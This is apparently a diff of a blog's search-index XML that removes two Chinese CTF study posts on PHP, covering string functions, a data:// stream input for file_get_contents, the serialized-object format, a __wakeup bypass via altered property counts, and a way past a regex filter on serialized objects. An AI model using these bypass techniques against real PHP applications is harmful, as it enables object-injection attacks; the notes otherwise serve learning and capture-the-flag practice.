+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>gopher_协议使用</title>
       <link href="/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/"/>
       <url>/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/</url>
@@ -429,31 +504,6 @@
     
     
     <entry>
-      <title>php函数简记</title>
-      <link href="/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
-      <url>/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</url>
-      
-        <content type="html"><![CDATA[<p>一些简单php函数简记</p><p>标签（空格分隔）： PHP </p><p>–PHP 函数</p><h2 id="php函数简记"><a href="#php函数简记" class="headerlink" title="php函数简记"></a>php函数简记</h2><p>在此输入正文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mb_substr()：函数返回字符串的一部分。substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span><br><span class="line">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span><br><span class="line"></span><br><span class="line">mb_strpos()：查找字符串在另一个字符串中首次出现的位置</span><br><span class="line"></span><br><span class="line">in_array()函数：搜索数组中是否存在指定的值。</span><br><span class="line">//注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</span><br><span class="line"></span><br><span class="line">strstr()函数：用于在一个字符串查找另一个字符串的第一次出现</span><br><span class="line">//注释：区分大小写</span><br><span class="line"></span><br><span class="line">urldecode()：解码已编码的 URL 字符串</span><br><span class="line"></span><br><span class="line">ord()：返回字符串第一个字符的ASCll值</span><br><span class="line"></span><br><span class="line">strrev()：用于反转字符串</span><br><span class="line">//如：strrev(&quot;hello&quot;)  echo: olleh</span><br><span class="line"></span><br><span class="line">strlen()：用于获取字符串的长度。返回字节数</span><br><span class="line"></span><br><span class="line">str_rot：用于对字符串进行ROT13编码</span><br><span class="line"></span><br><span class="line">chr()：用于从指定的ASCll值返回字符</span><br><span class="line">//注释：可以是10/8/16进制</span><br><span class="line"></span><br><span class="line">file_get_contents()： 是PHP中用于读取文件内容的函数</span><br><span class="line">//注释：将文件中数据提取为字符串的函数，要用data://协议构造数据流，使它当作php文件。</span><br><span class="line">//所以需要这样设计代码：?file2=data://text/plain,hello ctf</span><br><span class="line"></span><br><span class="line">str_split() 函数用于将字符串按指定的分隔符分割成多个子字符串，并返回一个包含这些子字符串的列表</span><br><span class="line"></span><br><span class="line">ctype_alpha 函数用于检测字符串中的所有字符是否都是字母。它返回布尔值：如果字符串中的每个字符都是字母，则返回 true，否则返回 false</span><br><span class="line"></span><br><span class="line">ctype_upper：检测提供的 string 类型的 text 里面的所有字符是否都是大写字符</span><br><span class="line"></span><br><span class="line">strlen() :检测字符串长度</span><br><span class="line">__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。这道题中发序列化之后就会触发析构函数。</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> PHP </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>预编译拼接字符法</title>
       <link href="/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/"/>
       <url>/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/</url>
@@ -471,31 +521,6 @@
         <tags>
             
             <tag> SQL绕过 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>PHP魔术技巧</title>
-      <link href="/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/"/>
-      <url>/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/</url>
-      
-        <content type="html"><![CDATA[<h1 id="php魔术技巧"><a href="#php魔术技巧" class="headerlink" title="php魔术技巧"></a>php魔术技巧</h1><p>标签（空格分隔）： PHP #魔术技巧#</p><p>—php</p><p>反序列化的基本格式：O:组的字节:”定义的组的名字”:有几个参数:{s:4:”flag”;s:3:”111”;}</p><p>构造脚本可以在后面这么加$A &#x3D; new Demo (‘fl4g.php’);&#x2F;&#x2F;创建对象<br>                                      $C &#x3D; serialize($A); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_wakeup()：如果察觉到有反序列化的参数值那么将会拒绝执行</span><br><span class="line">//绕过方法：将序列化的对象的属性（参数个数）个数改了</span><br><span class="line"></span><br><span class="line">__destruct():当对象的所有引用被删除或脚本执行结束时，PHP 会自动调用析构函数。</span><br><span class="line"></span><br><span class="line">preg_match(’/[oc]:\d+:/i’, $var)：当中括号的东西出现就会被过滤&#123;应对办法：单双引号绕过</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__construct()：这是一个构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法。</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> PHP </tag>
             
         </tags>
       
